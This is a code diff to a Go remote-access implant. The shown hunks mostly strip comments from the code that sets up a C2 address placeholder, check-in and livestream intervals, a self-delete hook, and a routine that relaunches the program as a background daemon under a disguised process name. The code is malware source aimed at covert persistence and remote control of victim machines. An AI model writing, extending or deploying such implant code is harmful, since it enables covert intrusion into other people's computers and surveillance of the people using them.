@@ -27,9 +27,8 @@ const (
 	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
 	checkInInterval      = 5 * time.Second
 	livestreamInterval   = 1 * time.Second
-	// backgroundMarkerEnvVar = "KTHREAD_ORIG_PATH_MARKER_XYZ789" // Old, caused conflict
-	backgroundMarkerEnvVar = "IMPLANT_IS_BACKGROUND_XYZ123"      // New marker for background status
-	originalPathEnvVar     = "IMPLANT_ORIG_LAUNCHER_PATH_XYZ789" // New var for original launcher path
+	backgroundMarkerEnvVar = "IMPLANT_IS_BACKGROUND_XYZ123"      
+	originalPathEnvVar     = "IMPLANT_ORIG_LAUNCHER_PATH_XYZ789" 
 )
 
 var (
@@ -41,7 +40,7 @@ var (
 	isLivestreamActive bool
 	stopLivestreamChan chan struct{}
 
-	gOriginalLauncherPath string // To store the path of the initial launcher
+	gOriginalLauncherPath string 
 )
 
 var doSelfDelete func(selfExePath string, originalLauncherPath string)
@@ -134,18 +133,16 @@ func initializeConfig() bool {
 }
 
 func main() {
-	exePath, err := os.Executable() // This is the path of the CURRENTLY executing file
+	exePath, err := os.Executable() 
 	if err != nil {
 		time.Sleep(10 * time.Second)
 		os.Exit(1)
 	}
 
-	// Check if this is already the background process using the new backgroundMarkerEnvVar
 	isBackgroundProcess := (os.Getenv(backgroundMarkerEnvVar) == "1")
 
 	if !isBackgroundProcess {
-		// --- This is the initial execution. Relaunch self in background. ---
-		relaunchArgs := []string{} // No command line arguments
+		relaunchArgs := []string{} 
 
 		var effectiveTargetProcessName string
 		if runtime.GOOS == "windows" {
@@ -156,18 +153,13 @@ func main() {
 			effectiveTargetProcessName = "implant_background_process"
 		}
 
-		// exePath here is the path of the file to BE COPIED AND RUN.
-		// Pass it as origPathValue.
-		// Use backgroundMarkerEnvVar for the background status marker, and originalPathEnvVar for the path.
 		relaunchErr := relaunchAsDaemon(exePath, relaunchArgs, effectiveTargetProcessName, backgroundMarkerEnvVar, originalPathEnvVar, exePath)
 		if relaunchErr != nil {
-			// Consider logging relaunchErr before exiting
 			os.Exit(1)
 		}
 		os.Exit(0) // Initial launcher exits after successfully starting the backgrounded copy.
 	}
 
-	// --- If we reach here, we ARE the background process. ---
 	// Clear the background marker environment variable.
 	os.Unsetenv(backgroundMarkerEnvVar)
 
